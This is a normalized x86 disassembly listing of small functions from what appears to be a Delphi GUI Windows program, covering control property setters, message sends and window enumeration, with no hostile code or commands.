pop ebx
pop ecx
pop ebp
retn
sub_4483a4
mov eax [ eax + 0x22c ]
call sub_443bd0
retn
sub_448439
jmp sub_403980
sub_448440
pop ecx
pop ebp
retn
sub_448444
mov eax [ r-xdata ]
retn
sub_448655
jmp sub_403980
sub_44865c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_448810
retn
sub_448915
jmp sub_403980
sub_44891c
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_448a08
mov al [ eax + 0x244 ]
retn
sub_448a10
mov edx eax
fld [ edx + 0x228 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne al
retn
sub_448a2c
mov edx eax
fld [ edx + 0x238 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne al
retn
sub_448a48
add esp 0xfffffff8
mov edx [ eax + 0x210 ]
mov [ esp ] edx
mov edx [ eax + 0x214 ]
mov [ esp + 0x4 ] edx
fld [ esp ]
pop ecx
pop edx
retn
sub_448a64
push esi
mov esi [ eax + 0x208 ]
cmp edx esi
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_448afd
jmp sub_4036cc
sub_448d80
jmp sub_403980
sub_448d87
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_448ebc
jmp sub_403980
sub_448ec3
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_44913c
cmp dl [ eax + 0x245 ]
je r-xdata
retn
mov [ eax + 0x245 ] dl
mov ecx edx
xor cl 0x1
mov edx 0x10
call sub_440e60
sub_44915c
cmp dl [ eax + 0x246 ]
je r-xdata
retn
mov [ eax + 0x246 ] dl
mov ecx edx
xor cl 0x1
mov edx 0x8
call sub_440e60
sub_44917c
cmp dl [ eax + 0x247 ]
je r-xdata
retn
mov [ eax + 0x247 ] dl
mov ecx edx
mov edx 0x4
call sub_440e60
sub_4493ee
das
add [ eax ] eax
retn
sub_4495a0
push ebx
mov ebx eax
mov eax ebx
call sub_4198dc
mov eax ebx
call sub_4197bc
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
pop ebx
retn
sub_44960c
push ebx
mov ebx eax
mov [ ebx + 0x20 ] edx
mov eax ebx
call sub_4197bc
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
pop ebx
retn
sub_449628
push ebx
mov ebx eax
mov [ ebx + 0x1c ] edx
mov eax ebx
call sub_4197bc
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
pop ebx
retn
sub_449644
push ebx
mov ebx eax
mov eax ebx
call sub_43b080
pop ebx
retn
sub_4496b8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43b1ec
pop esi
pop ebx
retn
sub_44985d
add [ esp + 0x4 ] 0xffffffec
jmp sub_44aa5c
sub_449867
add [ esp + 0x4 ] 0xffffffec
jmp sub_44ab48
sub_449871
add [ esp + 0x4 ] 0xffffffec
jmp sub_44ab34
sub_44987b
add [ esp + 0x4 ] 0xffffffec
jmp sub_44a9ac
sub_449885
add [ esp + 0x4 ] 0xffffffec
jmp sub_40594c
sub_44988f
add [ esp + 0x4 ] 0xffffffec
jmp sub_405974
sub_449899
add [ esp + 0x4 ] 0xffffffec
jmp sub_405988
sub_449de4
push ebx
push esi
mov esi eax
mov eax [ esi + 0x274 ]
push eax
mov ecx [ esi + 0x270 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xf4 ]
pop esi
pop ebx
retn
sub_44a01b
jmp sub_403980
sub_44a117
jmp sub_403980
sub_44a11e
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44a124
bound esp [ edi ]
mov ebx 0xd06a7700
adc [ ebp + 0x4fc00035 ] esp
xlat
shl [ edx - 0x75 ] 0x1
cmp [ edx + eax ] 0x0
add [ ebx + 0x1452ff10 ] cl
retn
sub_44a140
mov eax [ r-xdata ]
retn
sub_44a148
mov eax [ r-xdata ]
retn
sub_44a24a
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0x10
retn
sub_44a3e1
jmp sub_403980
sub_44a3e8
pop ebx
pop ecx
pop ebp
retn
sub_44a414
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x220 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x224 ] edx
pop ebp
retn 0x8
sub_44a4e2
jmp sub_403980
sub_44a4e9
pop ecx
pop ebp
retn
sub_44a578
mov eax [ eax + 0x14 ]
call sub_419dfc
retn
sub_44a6c1
jmp sub_403980
sub_44a6c8
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44a6f4
mov eax [ eax + 0x14 ]
call sub_419b1c
retn
sub_44a700
mov eax [ eax + 0x14 ]
call sub_419b1c
retn
sub_44a70c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_43b1ec
mov eax [ eax + 0x14 ]
pop esi
pop ebx
retn
sub_44a770
mov ecx [ eax ]
call [ ecx + 0x54 ]
retn
sub_44a778
push ebx
mov ebx ecx
mov eax [ eax + 0x14 ]
call sub_4496cc
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
pop ebx
retn
sub_44a7c0
push esi
mov esi ecx
mov eax [ eax + 0x14 ]
call sub_4496cc
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x24 ]
pop esi
retn
sub_44a814
mov eax [ r-xdata ]
retn
sub_44a81c
mov eax [ r-xdata ]
retn
sub_44a88c
jmp sub_403980
sub_44a893
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_44a968
jmp sub_403980
sub_44a96f
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_44aa2c
mov eax [ eax + 0xc ]
call sub_419b1c
retn
sub_44ab22
jmp sub_403980
sub_44ab29
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_44ab34
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax + 0x10 ] edx
xor eax eax
pop ebp
retn 0x4
sub_44abe3
jmp sub_403980
sub_44abea
pop ebp
retn
sub_44abec
sub [ rw-data ] 0x1
retn
sub_44ac5b
jmp [ edi ]
sub_44aefc
cmp [ eax + 0x5 ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x6 ] 0x0
je r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_44af14
push ebx
cmp [ eax + 0x6a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
sub_44af58
push ebx
mov ebx eax
mov eax ebx
call sub_44b7a0
mov eax ebx
mov edx [ eax ]
call [ edx ]
pop ebx
retn
sub_44b78f
jmp sub_403980
sub_44b7a0
push ebx
mov ebx eax
cmp [ ebx + 0x6 ] 0x0
je r-xdata
call sub_42fffc
mov [ ebx + 0x6 ] al
pop ebx
retn
mov eax ebx
call sub_44af28
sub_44b7f7
jmp sub_403980
sub_44b7fe
pop ebp
retn
sub_44b800
sub [ rw-data ] 0x1
retn
sub_44c570
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_44cd56
inc esp
add [ eax + eax ] al
adc [ eax - 0x42ee4ffa ] dh
0x28ff
sub_44d0a8
jmp [ eax ]
sub_44d388
mov dl 0x1
test eax eax
je r-xdata
xor edx edx
cmp [ eax + 0x7c ] 0x0
jne r-xdata
mov eax edx
retn
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
sub_44d438
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_455a4c
pop esi
pop ebx
retn
sub_44d5a2
jmp sub_403980
sub_44d5a9
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44d6b8
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_457b08
mov eax ebx
mov si 0xffc7
call sub_4033e8
pop esi
pop ebx
retn
sub_44d7a4
push esi
mov esi eax
cmp dl [ esi + 0x16c ]
je r-xdata
pop esi
retn
mov [ esi + 0x16c ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44d7c0
push esi
cmp dl [ eax + 0x16d ]
je r-xdata
pop esi
retn
mov [ eax + 0x16d ] dl
mov si 0xffc7
call sub_4033e8
sub_44d7dc
test [ eax + 0x50 ] 0x40
setne al
xor al 0x1
retn
sub_44d7e8
mov [ eax + 0x168 ] edx
test edx edx
je r-xdata
retn
xchg edx eax
call sub_4213bc
sub_44d7fc
push esi
mov esi eax
cmp dl [ esi + 0x170 ]
je r-xdata
pop esi
retn
mov [ esi + 0x170 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44d85c
push esi
mov esi eax
cmp dl [ esi + 0x16e ]
je r-xdata
pop esi
retn
mov [ esi + 0x16e ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44d8d0
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov si 0xffc7
call sub_4033e8
pop esi
pop ebx
retn
sub_44d8ec
push esi
mov esi eax
mov eax esi
call sub_457614
mov eax esi
mov si 0xffc7
call sub_4033e8
pop esi
retn
sub_44d991
jmp sub_403980
sub_44d998
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44d9a0
push ebx
mov ebx eax
mov eax ebx
call sub_457778
cmp [ ebx + 0x182 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x184 ]
call [ ebx + 0x180 ]
sub_44d9c4
push ebx
mov ebx eax
mov eax ebx
call sub_457790
cmp [ ebx + 0x17a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x17c ]
call [ ebx + 0x178 ]
sub_44d9e8
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x146
mov eax [ ebx + 0x10 ]
call sub_45c380
push eax
call SendMessageA
pop ebx
retn
sub_44da6a
jmp sub_403980
sub_44da71
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44db5c
jmp sub_403980
sub_44db63
pop ebx
pop ecx
pop ebp
retn
sub_44dd34
push ebx
mov ebx eax
mov edx r-xdata
mov eax ebx
call sub_455a28
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov [ ebx + 0x260 ] 0xffffffff
pop ebx
retn
sub_44dd84
push ebx
mov ebx eax
push 0xffff0000
push 0x0
push 0x142
mov eax ebx
call sub_45c380
push eax
call SendMessageA
pop ebx
retn
sub_44de78
test edx edx
jle r-xdata
retn
mov [ eax + 0x238 ] edx
call sub_4598e8
sub_44deac
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_44deb4
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_44debc
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_44dee8
cmp eax [ edx + 0x8 ]
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0x14f
call sub_456c00
sub_44e018
push ebx
push esi
mov esi eax
mov eax [ esi + 0x258 ]
push eax
mov ecx [ esi + 0x244 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xf4 ]
pop esi
pop ebx
retn
sub_44e2ef
jmp sub_4036cc
sub_44e2f4
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_4759fc
call sub_403a34
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_44e580
jmp sub_403980
sub_44e587
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44e590
push ebx
mov ebx eax
mov eax ebx
call sub_455658
cmp [ ebx + 0x21a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x21c ]
call [ ebx + 0x218 ]
sub_44e5b4
push ebx
cmp [ eax + 0x22a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x22c ]
call [ ebx + 0x228 ]
sub_44e630
push ebx
cmp [ eax + 0x232 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x234 ]
call [ ebx + 0x230 ]
sub_44e74a
jmp sub_403980
sub_44e794
or edx 0xffffffff
mov ecx [ eax ]
call [ ecx + 0xd0 ]
retn
sub_44e81f
jmp sub_403980
sub_44e826
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44e858
mov edx [ eax ]
call [ edx + 0x104 ]
retn
sub_44e864
mov [ eax + 0x210 ] edx
retn
sub_44e8b5
jmp sub_403980
sub_44e8bc
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44e976
jmp sub_403980
sub_44ea20
mov eax [ r-xdata ]
retn
sub_44ea28
xor eax eax
retn
sub_44ea4c
retn
sub_44eb64
cmp dl [ eax + 0x209 ]
je r-xdata
retn
mov [ eax + 0x209 ] dl
call sub_4598e8
sub_44ebdc
push ebx
mov ebx eax
mov eax ebx
call sub_46cc58
test eax eax
je r-xdata
mov eax ebx
call sub_456f88
pop ebx
retn
mov edx [ ebx + 0x214 ]
mov [ eax + 0x24c ] edx
sub_44ec00
xor eax eax
retn
sub_44ecc7
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x59d1173d ]
add [ eax ] al
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
pop ebx
retn
sub_44ece0
push esi
cmp [ edx + 0x6 ] 0x0
jne r-xdata
pop esi
retn
mov si 0xffeb
call sub_4033e8
sub_44edd1
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_44edda
jmp sub_403980
j_sub_44edd1
jmp sub_44edd1
sub_44ede1
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44ef14
mov al [ eax + 0x211 ]
retn
sub_44ef48
cmp dl [ eax + 0x210 ]
je r-xdata
retn
mov [ eax + 0x210 ] dl
call sub_4598e8
sub_44f128
call sub_4598e8
retn
sub_44f1a5
jmp sub_403980
sub_44f1ac
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44f209
jmp sub_403980
sub_44f210
pop ebp
retn
sub_44f214
sub [ rw-data ] 0x1
retn
sub_44f220
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_44f371
jmp sub_403980
sub_44f378
pop ebp
retn
sub_44f37c
sub [ rw-data ] 0x1
retn
sub_44f384
push 0xe9004896
inc [ eax ]
add ah cl
add eax 0xffffffe0
jmp sub_44fbfc
sub_44f395
add eax 0xffffffe0
jmp sub_44f97c
sub_44f39d
add eax 0xffffffe0
jmp sub_44f9e4
sub_44f3a5
add eax 0xffffffe0
jmp sub_44faf8
sub_44f3ad
add eax 0xffffffe0
jmp sub_44fb6c
sub_44f3b5
add eax 0xffffffe0
jmp sub_44f628
sub_44f3bd
add eax 0xffffffe0
jmp sub_44f63c
sub_44f3c5
add eax 0xffffffe0
jmp sub_44f6b4
sub_44f3cd
add eax 0xffffffe0
jmp sub_44f758
sub_44f3d5
add eax 0xffffffe0
jmp sub_44f75c
sub_44f3dd
add eax 0xffffffe0
jmp sub_44f7e4
sub_44f3e5
add eax 0xffffffe0
jmp sub_44f92c
sub_44f3ed
add eax 0xffffffe0
jmp sub_44f930
sub_44f3f5
add eax 0xffffffe0
jmp sub_44f94c
sub_44f3fd
add [ esp + 0x4 ] 0xffffffe0
jmp sub_40594c
sub_44f407
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405974
sub_44f411
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405988
sub_44f41c
std
inc esp
add [ edi ] al
hlt
sub_44f422
inc esp
add [ ecx ] dl
hlt
sub_44f4bc
pushad
hlt
sub_44f5e5
jmp sub_403980
sub_44f5ec
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44f628
push ebx
mov ebx edx
mov eax ebx
mov edx [ rw-data ]
call sub_403fd0
pop ebx
retn
sub_44f6a3
jmp sub_403980
sub_44f6aa
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44f73c
jmp sub_403980
sub_44f743
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44f758
mov al 0x1
retn
sub_44f7d7
jmp sub_403980
sub_44f7de
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44f8dc
jmp sub_403980
sub_44f8e3
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44f92c
mov [ eax + 0xc ] edx
retn
sub_44f930
mov [ eax + 0x10 ] 0x3
push 0x0
push 0x2
push r-xdata
push 0x0
call WinHelpA
retn
sub_44f955
inc [ ebx + 0x74001c7b ]
or [ ebp + 0x3ce81c43 ] cl
pop edi
sti
inc [ ebx + 0x489b183d ]
add [ eax ] al
je r-xdata
pop ebx
retn
mov eax rw-data
call sub_4058a0
sub_44f9d4
jmp sub_403980
sub_44f9db
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44fada
jmp sub_403980
sub_44fae1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44fb5a
jmp sub_403980
sub_44fb61
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44fbec
jmp sub_403980
sub_44fbf3
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44fce7
jmp sub_403980
sub_44fcee
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_44fdb0
mov [ eax + 0xc ] 0x0
mov [ eax + 0xd ] 0x0
xor edx edx
mov [ eax + 0x4 ] edx
push eax
push sub_44fcfc
call EnumWindows
retn
sub_44fe42
jmp sub_403980
sub_44fe49
mov al [ ebp - 0x5 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_44fe54
xor eax eax
retn
sub_44ff4d
jmp sub_403980
sub_44ff54
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45003e
jmp sub_403980
sub_450045
pop ebp
retn
sub_45009a
jmp sub_403980
sub_4500a1
pop ebp
retn
sub_451230
jmp r-xdata
sub_451232
0xe8ffe9ff 0xe7ff
sub_451239
jmp esi
sub_4527d8
mov dl [ eax ]
sub dl 0x1
jb r-xdata
mov [ eax ] 0x1
retn
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
retn
sub_452aeb
inc [ esi ]
add [ eax ] al
add [ ebx + 0x72 ] ah
push ebx
imul edi [ edx + 0x65 ] 0x156a0000
mov ecx rw-data
call sub_4186e8
retn
sub_452b08
push 0x15
mov ecx rw-data
call sub_4186a8
retn
sub_452bf4
call GetCapture
call sub_4528d8
test eax eax
je r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax [ rw-data ]
sub_452e58
push ebx
push eax
push sub_452fdc
call sub_422438
mov ebx eax
push ebx
call SetCapture
mov eax ebx
pop ebx
retn
sub_452e70
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_452ea0
push ebx
mov ebx edx
call ReleaseCapture
mov eax ebx
call sub_4224ec
pop ebx
retn
sub_452f7e
jmp sub_4036cc
sub_452fb0
xor eax eax
retn
sub_452fb4
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov ax 0xfff4
jmp r-xdata
pop ebp
retn 0x4
sub_452fcc
retn
sub_452fd0
mov eax [ rw-data ]
retn
sub_452fd8
retn
sub_453006
jmp sub_4036cc
sub_45300b
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_4759fc
call sub_403a34
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_453028
call sub_403444
xor eax eax
mov [ rw-data ] eax
retn
sub_453038
call sub_403440
xor eax eax
mov [ rw-data ] eax
retn
sub_453048
test dl dl
je r-xdata
mov [ eax + 0x38 ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403550
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_4530f8
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov eax [ eax + 0x38 ]
mov ax [ eax + 0x7a ]
jmp r-xdata
pop ebp
retn 0x4
sub_453110
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
retn
sub_45315c
retn
sub_453314
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffdb
call sub_4033e8
pop esi
retn
sub_453328
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffda
call sub_4033e8
pop esi
retn
sub_45333c
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_453348
mov eax 0x4
retn
sub_453350
retn
sub_453f41
jmp sub_4036cc
sub_45422e
jmp sub_403980
sub_4542a0
jmp sub_403980
sub_4542ac
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
xor eax eax
call sub_453fd4
sub_45442b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_425630
retn
sub_454441
jmp sub_403980
sub_454468
jmp sub_403980
sub_4544ea
jmp sub_403980
sub_454512
jmp sub_403980
sub_454519
mov esp ebp
pop ebp
retn
sub_4545d1
jmp sub_403980
sub_454628
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x58 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4545f4
mov [ ebx + 0x58 ] esi
sub_45477c
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_454790
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_40339c
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_454879
jmp sub_403980
sub_454880
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_454903
jmp sub_403980
sub_45490a
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_454cd8
xor eax eax
retn
sub_454cdc
mov al [ eax + 0x58 ]
retn
sub_454ce0
xor eax eax
retn
sub_454ce4
cmp [ eax + 0x30 ] 0x0
setne al
retn
sub_454cec
mov eax [ eax + 0x30 ]
retn
sub_454d90
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x10 ]
retn
sub_454e3c
push ebx
mov ebx eax
xor eax eax
mov al [ ebx + 0x5b ]
mov al [ eax + rw-data ]
cmp al [ ebx + 0x61 ]
setne al
pop ebx
retn
sub_454e54
mov [ eax + 0x5d ] dl
retn
sub_454e58
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
xchg edx eax
call sub_458b4c
sub_454e68
push ebx
cmp [ eax + 0xfa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
sub_45534b
jmp sub_403980
sub_455352
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4553b4
test [ eax + 0x1c ] 0x1
jne r-xdata
mov [ eax + 0x158 ] edx
retn
mov [ eax + 0x150 ] 0x1
sub_455438
xor ecx ecx
mov [ edx ] ecx
xor ecx ecx
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x48 ]
mov [ edx + 0x8 ] ecx
mov eax [ eax + 0x4c ]
mov [ edx + 0xc ] eax
retn
sub_455555
jmp sub_403980
sub_45555c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_455658
push eax
xor ecx ecx
mov edx 0xb037
call sub_456c00
retn
sub_455819
add [ eax ] al
add [ esi + 0x3a ] dl
push eax
pop esp
je r-xdata
pop esi
retn
mov [ eax + 0x5c ] dl
test dl dl
je r-xdata
mov si 0xffee
call sub_4033e8
sub_4558ca
jmp sub_403980
sub_4558d1
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4559a8
cmp dl [ eax + 0x58 ]
je r-xdata
retn
mov [ eax + 0x58 ] dl
push 0x0
xor ecx ecx
mov edx 0xb00c
call sub_456c00
sub_4559c0
push 0x0
xor ecx ecx
mov edx 0xe
call sub_456c00
retn
sub_4559d0
push edx
mov edx 0xd
call sub_456c00
retn
sub_4559dc
mov edx [ eax + 0xac ]
test edx edx
jle r-xdata
mov eax [ eax + 0x4c ]
retn
mov eax edx
retn
sub_4559f0
mov edx [ eax + 0xa8 ]
test edx edx
jle r-xdata
mov eax [ eax + 0x48 ]
retn
mov eax edx
retn
sub_455ad1
jmp sub_403980
sub_455ad8
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_455ae0
cmp dl [ eax + 0x5f ]
je r-xdata
retn
mov [ eax + 0x5f ] dl
mov [ eax + 0x60 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb03c
call sub_456c00
sub_455b50
cmp [ eax + 0x59 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x56 ] 0x0
je r-xdata
mov al 0x1
retn
sub_455b64
mov al [ eax + 0x9a ]
xor al 0x1
retn
sub_455b70
mov al [ eax + 0x60 ]
xor al 0x1
retn
sub_455b78
cmp dl [ eax + 0x59 ]
je r-xdata
retn
mov [ eax + 0x59 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb008
call sub_456c00
sub_455b9c
cmp dl [ eax + 0x99 ]
je r-xdata
retn
mov [ eax + 0x99 ] dl
mov [ eax + 0x9a ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb022
call sub_456c00
sub_455bc0
cmp dl [ eax + 0x9a ]
je r-xdata
retn
mov [ eax + 0x9a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb023
call sub_456c00
sub_455c08
mov al [ eax + 0x5a ]
xor al 0x1
retn
sub_455c10
cmp dl [ eax + 0x5a ]
je r-xdata
retn
mov [ eax + 0x5a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb009
call sub_456c00
sub_455c34
cmp dl [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
call sub_456c00
sub_455c58
cmp dx [ eax + 0x78 ]
je r-xdata
retn
mov [ eax + 0x78 ] dx
push 0x0
xor ecx ecx
mov edx 0xb00f
call sub_456c00
sub_455c74
push ebx
mov ebx eax
call sub_452bf4
cmp ebx eax
sete al
pop ebx
retn
sub_455cac
push esi
mov dl 0x1
mov si 0xffce
call sub_4033e8
pop esi
retn
sub_455df6
jmp sub_403980
sub_455dfd
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_455f20
test [ eax + 0x50 ] 0x40
setne cl
mov dl [ eax + 0x57 ]
call sub_455e94
retn
sub_455f74
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x88 ]
sub_455f88
mov edx [ eax ]
call [ edx + 0x80 ]
retn
sub_45606d
jmp sub_403980
sub_45608c
xor eax eax
retn
sub_456090
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x0
jne r-xdata
mov al 0x1
retn
sub_4560a8
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x1
je r-xdata
mov al 0x1
retn
sub_4560c0
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
mov al [ eax + 0x5f ]
dec eax
sub al 0x2
jb r-xdata
mov al 0x1
retn
sub_4560dc
mov edx [ rw-data ]
mov ecx [ edx + 0x8 ]
mov edx [ rw-data ]
mov dl [ edx + 0x4 ]
call sub_4560f4
retn
sub_4561b8
retn
sub_4561bc
cmp eax [ rw-data ]
sete al
retn
sub_456230
push ebx
cmp [ eax + 0x112 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
sub_45634c
push ebp
mov ebp esp
push esi
mov si 0xffd2
call sub_4033e8
pop esi
pop ebp
retn 0x4
sub_45638c
push ebx
cmp [ eax + 0x102 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
sub_456623
jmp sub_403980
sub_45662a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_456634
push esi
mov esi eax
xor ecx ecx
mov eax esi
mov si 0xffe8
call sub_4033e8
pop esi
retn
sub_456648
push esi
mov esi eax
mov cl 0x1
mov eax esi
mov si 0xffe8
call sub_4033e8
pop esi
retn
sub_456917
jmp sub_403980
sub_4569c0
push esi
mov si 0xffee
call sub_4033e8
pop esi
retn
sub_4569cc
mov al 0x1
retn
sub_456ca4
mov ecx [ edx ]
